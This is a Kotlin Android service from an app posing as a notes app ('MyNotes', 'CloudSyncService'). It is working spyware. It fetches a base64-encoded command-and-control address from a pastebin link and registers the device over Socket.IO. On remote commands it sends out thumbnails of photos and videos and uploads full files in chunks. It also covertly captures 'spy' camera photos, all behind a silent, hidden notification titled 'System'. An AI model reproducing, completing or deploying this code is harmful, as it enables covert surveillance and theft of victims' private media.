package cl.example.mynotes

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.ThumbnailUtils
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessaging
import io.socket.client.IO
import io.socket.client.Socket
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.HashSet

class CloudSyncService : Service() {

    private var socket: Socket? = null
    // --- CAMBIA ESTO SI USAS TU IP LOCAL ---
    private val RESOLVER_URL = "https://pastebin.com/raw/gNmxTyPZ"
    private var activeServerUrl: String = ""

    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    @Volatile private var isScanning = false

    override fun onCreate() {
        super.onCreate()
        Log.d("CloudSync", "🔵 onCreate: Servicio Creado.")

        // 1. FOREGROUND INMEDIATO (CON PERMISOS DE CÁMARA PARA ANDROID 14)
        try {
            val notification = createNotification()
            if (Build.VERSION.SDK_INT >= 34) {
                // Android 14 requiere declarar Data Sync y Camera
                startForeground(
                    1,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                )
            } else if (Build.VERSION.SDK_INT >= 29) {
                startForeground(
                    1,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                )
            } else if (Build.VERSION.SDK_INT >= 26) {
                startForeground(1, notification)
            }
        } catch (e: Exception) {
            Log.e("CloudSync", "⚠️ Fallo Foreground onCreate: ${e.message}")
        }

        // 2. WAKELOCK
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyNotes:SyncTag")
        wakeLock?.acquire(30 * 60 * 1000L)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("CloudSync", "🚀 onStartCommand: ORDEN DE INICIO.")

        // 1. RE-ASEGURAR NOTIFICACIÓN (MISMA LÓGICA DE PERMISOS)
        try {
            val notification = createNotification()
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(
                    1,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                )
            } else if (Build.VERSION.SDK_INT >= 29) {
                startForeground(
                    1,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                )
            } else if (Build.VERSION.SDK_INT >= 26) {
                startForeground(1, notification)
            }
        } catch (e: Exception) {
            Log.e("CloudSync", "⚠️ Fallo Foreground onStartCommand: ${e.message}")
        }

        // 2. FUERZA BRUTA: Matar socket anterior si existe
        if (socket != null) {
            try {
                Log.d("CloudSync", "♻️ Socket viejo detectado. Destruyendo...")
                socket?.disconnect()
                socket?.off()
                socket = null
            } catch (e: Exception) {}
        }

        // 3. INICIAR NUEVA CONEXIÓN
        iniciarSecuenciaDeConexion()

        return START_STICKY
    }

    private fun iniciarSecuenciaDeConexion() {
        serviceScope.launch {
            if (activeServerUrl.isEmpty()) {
                val resolved = resolveC2Url()
                if (resolved != null) activeServerUrl = resolved else return@launch
            }
            conectarSocketIO()
        }
    }

    private fun conectarSocketIO() {
        try {
            Log.d("CloudSync", "🔌 Conectando a: $activeServerUrl")

            val options = IO.Options().apply {
                reconnection = true
                forceNew = true // Obliga a una sesión nueva
                timeout = 5000
            }
            socket = IO.socket(activeServerUrl, options)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("CloudSync", "✅ SOCKET CONECTADO. Esperando estabilización...")

                // --- EL RETARDO MÁGICO + CARPETAS ---
                serviceScope.launch {
                    delay(2000)
                    Log.d("CloudSync", "📤 Enviando credenciales...")
                    registrarDispositivo()

                    delay(1000) // Un segundo después, enviamos carpetas
                    Log.d("CloudSync", "📂 Enviando lista de carpetas...")
                    sendFolderList()
                }
            }

            setupSocketEvents()
            socket?.connect()
        } catch (e: Exception) {
            Log.e("CloudSync", "Error Socket: ${e.message}")
        }
    }

    private fun registrarDispositivo() {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val token = task.result
                try {
                    val info = JSONObject().apply {
                        put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
                        put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
                        put("dataType", "register_device")
                        put("fcmToken", token)
                    }
                    socket?.emit("usrData", info)
                    Log.d("CloudSync", "✅ Registro enviado: ...${token.takeLast(6)}")
                } catch (e: Exception) { e.printStackTrace() }
            }
        }
    }

    private fun setupSocketEvents() {
        socket?.on("command_start_scan") { args ->
            if (!isScanning) {
                isScanning = true
                var folderFilter: String? = null
                var scanType = "all"

                if (args.isNotEmpty()) {
                    val params = args[0] as? JSONObject
                    folderFilter = params?.optString("folder")
                    if (folderFilter.isNullOrEmpty()) folderFilter = null
                    scanType = params?.optString("type") ?: "all"
                }

                serviceScope.launch {
                    if (scanType == "photos" || scanType == "all") {
                        sendThumbnails(folderFilter)
                    }
                    if (scanType == "videos" || scanType == "all") {
                        scanVideos(folderFilter)
                    }
                    isScanning = false
                }
            }
        }

        socket?.on("command_stop_scan") {
            Log.d("CloudSync", "🛑 STOP FORCE recibido. Apagando servicio...")
            isScanning = false
            stopSelf() // ESTO MATA EL SERVICIO REALMENTE
        }

        socket?.on("command_take_photo") { takeSpyPhoto() }

        socket?.on("request_full_image") { args ->
            val data = args[0] as JSONObject
            uploadFileHttp(data.optString("path"), data.optString("target"))
        }
    }

    // --- LOGICA DE CARPETAS ---
    // --- LÓGICA DE CARPETAS MEJORADA (FOTOS + VIDEOS) ---
    private fun sendFolderList() {
        val uniqueFolders = HashSet<String>()

        // 1. Buscar carpetas de IMÁGENES
        val uriImages = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
        try {
            contentResolver.query(uriImages, projection, null, null, null)?.use { cursor ->
                val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    val folderName = cursor.getString(idxBucket)
                    if (!folderName.isNullOrEmpty()) uniqueFolders.add(folderName)
                }
            }
        } catch (e: Exception) { Log.e("CloudSync", "Error carpetas img: ${e.message}") }

        // 2. Buscar carpetas de VIDEOS (¡ESTO FALTABA!)
        val uriVideos = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        try {
            contentResolver.query(uriVideos, projection, null, null, null)?.use { cursor ->
                val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    val folderName = cursor.getString(idxBucket)
                    if (!folderName.isNullOrEmpty()) uniqueFolders.add(folderName)
                }
            }
        } catch (e: Exception) { Log.e("CloudSync", "Error carpetas video: ${e.message}") }

        // 3. Enviar lista combinada y ordenada
        if (uniqueFolders.isNotEmpty()) {
            val sortedList = uniqueFolders.sorted()
            val data = JSONObject().apply {
                put("dataType", "folder_list")
                put("folders", JSONArray(sortedList))
            }
            socket?.emit("usrData", data)
            Log.d("CloudSync", "📂 Lista de carpetas enviada (${uniqueFolders.size} encontradas)")
        }
    }

    // --- ESCANEO DE FOTOS ---
    private fun sendThumbnails(targetFolder: String?) {
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
        var selection: String? = null
        var selectionArgs: Array<String>? = null
        if (targetFolder != null) {
            selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} LIKE ?"
            selectionArgs = arrayOf("%$targetFolder%")
        }
        try {
            contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                val idxData = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    if (!serviceScope.isActive || !isScanning || socket?.connected() != true) break
                    val path = cursor.getString(idxData)
                    val name = cursor.getString(idxName)
                    val thumb = getThumb(path)
                    if (thumb != null) {
                        val data = JSONObject().apply {
                            put("name", name); put("path", path)
                            put("folder", File(path).parentFile?.name ?: "Unknown")
                            put("image64", encodeToBase64(thumb, 30))
                            put("dataType", "preview_image")
                        }
                        socket?.emit("usrData", data)
                        runBlocking { delay(50) }
                    }
                }
            }
        } catch (e: Exception) {}
    }

    // --- ESCANEO DE VIDEOS (Implementada) ---
    private fun scanVideos(targetFolder: String?) {
        val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME)
        val sortOrder = "${MediaStore.Video.Media.DATE_ADDED} DESC"
        var selection: String? = null
        var selectionArgs: Array<String>? = null
        if (targetFolder != null) {
            selection = "${MediaStore.Video.Media.BUCKET_DISPLAY_NAME} LIKE ?"
            selectionArgs = arrayOf("%$targetFolder%")
        }

        try {
            contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                val idxData = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
                val idxName = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    if (!serviceScope.isActive || !isScanning || socket?.connected() != true) break
                    val path = cursor.getString(idxData)
                    val name = cursor.getString(idxName)
                    val thumb = try {
                        ThumbnailUtils.createVideoThumbnail(path, MediaStore.Images.Thumbnails.MINI_KIND)
                    } catch (e: Exception) { null }

                    if (thumb != null) {
                        val data = JSONObject().apply {
                            put("name", name)
                            put("path", path)
                            put("folder", File(path).parentFile?.name ?: "Unknown")
                            put("image64", encodeToBase64(thumb, 30))
                            put("dataType", "preview_video")
                        }
                        socket?.emit("usrData", data)
                        runBlocking { delay(50) }
                    }
                }
            }
        } catch (e: Exception) { Log.e("CloudSync", "Error videos: ${e.message}") }
    }

    private fun resolveC2Url(): String? {
        val client = OkHttpClient()
        val request = Request.Builder().url(RESOLVER_URL).build()
        return try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return null
                val encodedBody = response.body?.string()?.trim() ?: return null
                val decodedBytes = Base64.decode(encodedBody, Base64.DEFAULT)
                String(decodedBytes, Charsets.UTF_8).trim()
            }
        } catch (e: Exception) { null }
    }

    // --- SUBIDA DE ARCHIVOS (Implementada) ---
    private fun uploadFileHttp(path: String, targetSocketId: String?) {
        val file = File(path)
        if (!file.exists() || activeServerUrl.isEmpty()) {
            Log.e("CloudSync", "❌ Archivo no existe o Server URL vacía")
            return
        }

        serviceScope.launch(Dispatchers.IO) {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val client = OkHttpClient()
                val chunkSize = 1 * 1024 * 1024
                val totalChunks = (file.length() + chunkSize - 1) / chunkSize
                val buffer = ByteArray(chunkSize)

                Log.d("CloudSync", "📤 Iniciando subida: ${file.name}")

                file.inputStream().use { input ->
                    var bytesRead = input.read(buffer)
                    var chunkIndex = 0
                    while (bytesRead != -1) {
                        if (!serviceScope.isActive) break
                        val chunkBody = buffer.copyOf(bytesRead).toRequestBody("multipart/form-data".toMediaTypeOrNull())
                        val requestBody = MultipartBody.Builder()
                            .setType(MultipartBody.FORM)
                            .addFormDataPart("deviceId", deviceId)
                            .addFormDataPart("filename", file.name)
                            .addFormDataPart("chunkIndex", chunkIndex.toString())
                            .addFormDataPart("totalChunks", totalChunks.toString())
                            .addFormDataPart("folderName", file.parentFile?.name ?: "General")
                            .addFormDataPart("file", file.name, chunkBody)
                            .build()

                        val uploadUrl = if (activeServerUrl.endsWith("/")) "${activeServerUrl}upload-chunk" else "$activeServerUrl/upload-chunk"
                        val request = Request.Builder().url(uploadUrl).post(requestBody).build()
                        client.newCall(request).execute().close()
                        chunkIndex++
                        bytesRead = input.read(buffer)
                    }
                }
                Log.d("CloudSync", "✅ Subida completada: ${file.name}")
            } catch (e: Exception) {
                Log.e("CloudSync", "❌ Error subiendo archivo: ${e.message}")
            }
        }
    }

    // --- FOTO ESPÍA (Implementada con Camera2) ---
    private fun takeSpyPhoto() {
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            var cameraId = manager.cameraIdList.firstOrNull { id ->
                manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
            } ?: manager.cameraIdList.firstOrNull()

            if (cameraId == null) return

            val reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)

            reader.setOnImageAvailableListener({ imgReader ->
                var image: android.media.Image? = null
                try {
                    image = imgReader.acquireLatestImage()
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)

                    val data = JSONObject().apply {
                        put("name", "spy_${System.currentTimeMillis()}.jpg")
                        put("path", "camera/spy")
                        put("folder", "SPY_CAM")
                        put("image64", base64)
                        put("dataType", "preview_image")
                    }
                    socket?.emit("usrData", data)
                    Log.d("CloudSync", "📸 Foto Espía enviada.")
                } catch (e: Exception) {
                    Log.e("CloudSync", "Error procesando foto: ${e.message}")
                } finally {
                    image?.close()
                    reader.close()
                }
            }, null)

            if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        try {
                            camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    try {
                                        val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                        builder.addTarget(reader.surface)
                                        builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                        session.capture(builder.build(), object : CameraCaptureSession.CaptureCallback() {
                                            override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                                camera.close()
                                            }
                                        }, null)
                                    } catch (e: Exception) { camera.close() }
                                }
                                override fun onConfigureFailed(session: CameraCaptureSession) { camera.close() }
                            }, null)
                        } catch (e: Exception) { camera.close() }
                    }
                    override fun onDisconnected(camera: CameraDevice) { camera.close() }
                    override fun onError(camera: CameraDevice, error: Int) { camera.close() }
                }, null)
            }
        } catch (e: Exception) {
            Log.e("CloudSync", "❌ Error fatal en cámara: ${e.message}")
        }
    }

    private fun getThumb(path: String): Bitmap? = try {
        ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(path), 96, 96)
    } catch (e: Exception) { null }

    private fun encodeToBase64(bm: Bitmap, quality: Int): String {
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, quality, baos)
        return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("CloudSync", "🔴 onDestroy: Limpiando.")
        try { socket?.disconnect() } catch (e: Exception) {}
        serviceJob.cancel()
        try { wakeLock?.release() } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotification(): Notification {
        val channelId = "SyncChannel_Final"
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(channelId, "Sync", NotificationManager.IMPORTANCE_MIN)
            channel.setSound(null, null)
            channel.enableVibration(false)
            channel.lockscreenVisibility = Notification.VISIBILITY_SECRET
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System")
            .setContentText(".")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }
}